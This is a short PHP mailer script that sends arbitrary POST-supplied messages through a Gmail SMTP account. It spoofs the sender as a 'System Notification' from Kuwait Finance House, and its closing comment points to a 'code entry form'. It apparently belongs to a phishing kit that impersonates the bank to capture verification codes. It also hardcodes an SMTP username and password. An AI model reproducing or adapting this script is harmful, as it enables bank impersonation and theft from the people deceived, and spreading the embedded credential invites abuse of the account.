<?php

    $email = $_POST["email"];
    $message = $_POST["message"];
    $subject = $_POST["subject"];

    require "vendor/autoload.php";

    use PHPMailer\PHPMailer\PHPMailer;
    use PHPMailer\PHPMailer\SMTP;

    $mail = new PHPMailer(true);

    $mail->SMTPDebug = SMTP::DEBUG_SERVER;

    $mail->isSMTP();
    $mail->SMTPAuth = true;

    $mail->Host = "smtp.gmail.com";
    $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
    $mail->Port = 587;

    $mail->Username = "system.kwh@gmail.com";
    $mail->Password = "vgnkobejfgmsrnnn";

    $mail->setFrom("system@kwh.com", "System Notification :: Kuwait Finance House");
    $mail->addAddress($email);

    $mail->Subject = $subject;
    $mail->Body = $message;

    $mail->send();

    //header location to code entry form

?>